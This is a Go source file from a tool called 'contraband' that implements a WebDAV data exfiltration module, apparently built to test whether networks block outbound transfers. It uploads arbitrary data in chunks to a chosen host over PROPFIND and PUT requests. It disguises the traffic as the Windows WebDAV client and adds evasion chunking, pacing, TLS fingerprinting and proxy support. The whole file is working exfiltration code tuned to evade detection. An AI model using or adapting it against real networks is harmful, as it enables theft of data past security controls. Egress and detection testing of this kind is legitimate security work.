package web

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

type WebDAVExfiltrator struct{}

func NewWebDAVExfiltrator() *WebDAVExfiltrator {
	return &WebDAVExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoWebDAV, NewWebDAVExfiltrator())
}

func (e *WebDAVExfiltrator) Protocol() string {
	return common.ProtoWebDAV
}

func (e *WebDAVExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.TLSProfile = opts.TLSFingerprint
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.TotalBytes <= 0 {
		if br, ok := reader.(*bytes.Reader); ok {
			opts.TotalBytes = int64(br.Len())
		} else if bb, ok := reader.(*bytes.Buffer); ok {
			opts.TotalBytes = int64(bb.Len())
		}
	}

	if opts.ExpectedHash == "" {
		if br, ok := reader.(*bytes.Reader); ok {
			cur, _ := br.Seek(0, io.SeekCurrent)
			h := sha256.New()
			_, _ = io.Copy(h, br)
			opts.ExpectedHash = hex.EncodeToString(h.Sum(nil))
			_, _ = br.Seek(cur, io.SeekStart)
		}
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	totalChunks := int(chunker.TotalChunks())
	result.TargetVolume = opts.TotalBytes

	isTLS := opts.UseTLS || (opts.TargetPort != 80 && opts.InsecureTLS) || opts.TargetPort == 443 || opts.TargetPort == 8443 || opts.TargetPort == 9443 || opts.TargetPort == 10443
	scheme := "http"
	if isTLS {
		scheme = "https"
	}

	var client *http.Client
	if isTLS {
		tlsCfg := exfil.TLSConfig{
			ServerName:         opts.TargetHost,
			InsecureSkipVerify: opts.InsecureTLS,
			Fingerprint:        opts.TLSFingerprint,
			ALPN:               []string{"http/1.1"},
		}
		tr := exfil.NewHTTPTransport(tlsCfg)
		if opts.ProxyDialer != nil {
			tr.DialContext = opts.ProxyDialer.DialContext
		}
		client = &http.Client{Transport: tr, Timeout: opts.Timeout}
	} else {
		tr := &http.Transport{
			MaxIdleConns:        100,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		}
		if opts.ProxyDialer != nil {
			tr.DialContext = opts.ProxyDialer.DialContext
		}
		client = &http.Client{Transport: tr, Timeout: opts.Timeout}
	}
	defer client.CloseIdleConnections()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	if isTLS {
		result.Timestamps.HandshakeTLS = time.Now().UTC()
	}

	// Phase 1: PROPFIND collection discovery mimicking Windows WebClient MiniRedir
	propfindURL := fmt.Sprintf("%s://%s:%d/webdav/", scheme, opts.TargetHost, opts.TargetPort)
	propfindBody := `<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:prop><D:resourcetype/></D:prop></D:propfind>`
	propReq, err := http.NewRequestWithContext(ctx, "PROPFIND", propfindURL, strings.NewReader(propfindBody))
	if err != nil {
		result.Verdict = common.ClassifyError(err)
		result.ErrorMessage = fmt.Sprintf("webdav propfind request failed: %v", err)
		result.Timestamps.TeardownDone = time.Now().UTC()
		e.calculateDurations(&result)
		return &result, err
	}
	propReq.Header.Set("User-Agent", "Microsoft-WebDAV-MiniRedir/10.0.19041")
	propReq.Header.Set("Depth", "0")
	propReq.Header.Set("Content-Type", "application/xml; charset=utf-8")
	if propResp, err := client.Do(propReq); err != nil {
		result.Verdict = common.ClassifyError(err)
		result.ErrorMessage = fmt.Sprintf("webdav propfind error: %v", err)
		result.Timestamps.TeardownDone = time.Now().UTC()
		e.calculateDurations(&result)
		return &result, err
	} else {
		_ = propResp.Body.Close()
	}

	result.Timestamps.FirstByteSent = time.Now().UTC()

	// Phase 2: PUT upload mimicking Windows WebClient
	putURL := fmt.Sprintf("%s://%s:%d/webdav/%s.bin", scheme, opts.TargetHost, opts.TargetPort, opts.SessionToken.String())
	var lastRespBody []byte
	var headEvidence []byte

	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = err.Error()
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 768 && len(chunkFrame) > common.ChunkHeaderSize {
			p := chunkFrame[common.ChunkHeaderSize:]
			needed := 768 - len(headEvidence)
			if needed > len(p) {
				needed = len(p)
			}
			headEvidence = append(headEvidence, p[:needed]...)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = common.ClassifyError(err)
				result.ErrorMessage = err.Error()
				result.Timestamps.TeardownDone = time.Now().UTC()
				e.calculateDurations(&result)
				return &result, err
			}
		}

		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = common.ClassifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					result.Timestamps.TeardownDone = time.Now().UTC()
					e.calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		putReq, err := http.NewRequestWithContext(ctx, http.MethodPut, putURL, bytes.NewReader(chunkFrame))
		if err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = err.Error()
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}
		putReq.Header.Set("User-Agent", "Microsoft-WebDAV-MiniRedir/10.0.19041")
		putReq.Header.Set("Content-Type", "application/octet-stream")
		putReq.Header.Set("Translate", "f")
		putReq.Header.Set(common.HeaderSessionID, opts.SessionToken.String())
		putReq.Header.Set(common.HeaderSequence, fmt.Sprintf("%d", seq))
		putReq.Header.Set(common.HeaderTotalChunks, fmt.Sprintf("%d", totalChunks))
		putReq.Header.Set(common.HeaderPayloadLength, fmt.Sprintf("%d", len(chunkFrame)-common.ChunkHeaderSize))
		putReq.Header.Set(common.HeaderPayloadHash, opts.ExpectedHash)

		for k, v := range opts.Headers {
			putReq.Header.Set(k, v)
		}

		resp, err := client.Do(putReq)
		if err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = fmt.Sprintf("webdav put failed: %v", err)
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}

		respBody, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		lastRespBody = respBody
		result.BytesSent += int64(len(chunkFrame))
		result.BytesRecv += int64(len(respBody))

		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusNoContent {
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)

			var ack common.VerificationACK
			if jsonErr := json.Unmarshal(respBody, &ack); jsonErr == nil && ack.Verdict != "" {
				result.Verdict = ack.Verdict
				result.ErrorMessage = ack.ErrorMessage
			} else {
				result.Verdict = common.VerdictBlockedL7
				result.ErrorMessage = fmt.Sprintf("webdav put returned status %d: %s", resp.StatusCode, string(respBody))
			}
			return &result, fmt.Errorf("%s", result.ErrorMessage)
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()

	// Parse and strictly verify cryptographic verification ACK
	var ack common.VerificationACK
	if err := json.Unmarshal(lastRespBody, &ack); err != nil {
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = fmt.Sprintf("failed to parse webdav verification ACK: %v", err)
		e.calculateDurations(&result)
		return &result, fmt.Errorf("invalid verification ACK: %w", err)
	}

	verdict, verifyErr := ack.Verify(opts.ExpectedHash, totalChunks)
	result.Verdict = verdict
	if verifyErr != nil {
		result.ErrorMessage = verifyErr.Error()
		e.calculateDurations(&result)
		return &result, verifyErr
	}

	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	e.calculateDurations(&result)
	return &result, nil
}

func (e *WebDAVExfiltrator) calculateDurations(r *common.ProbeResult) {
	t := &r.Timestamps
	if t.TeardownDone.IsZero() {
		t.TeardownDone = time.Now().UTC()
	}
	t.ComputeDurations()
	if t.TransferDuration > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(t.TransferDuration) / float64(time.Second)) / 1000.0
	}
}
